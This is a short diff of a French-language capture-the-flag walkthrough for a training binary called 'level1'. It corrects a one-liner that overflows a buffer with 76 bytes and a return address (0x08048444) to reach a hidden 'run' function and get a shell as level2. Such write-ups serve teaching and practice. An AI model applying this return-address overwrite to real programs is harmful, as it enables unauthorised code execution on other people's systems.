@@ -27,7 +27,7 @@ Dans le code du programme une fonction "run" se cache a l'interieur et elle perm
 elle se situe a l'addresse 0x08048444
 donc si on execute cette ligne, grace a l'overflow on reussi a executer la fonction run et on peut donc recuperer le flag depuis le shell proposé.
 
-$> (python -c "print 'A' * 76" + '\x44\x84\x04\x08'" ; cat) | ./level1
+$> (python -c "print 'A' * 76 + '\x44\x84\x04\x08'" ; cat) | ./level1
 whoami
 level2
 cd /home/user/level2
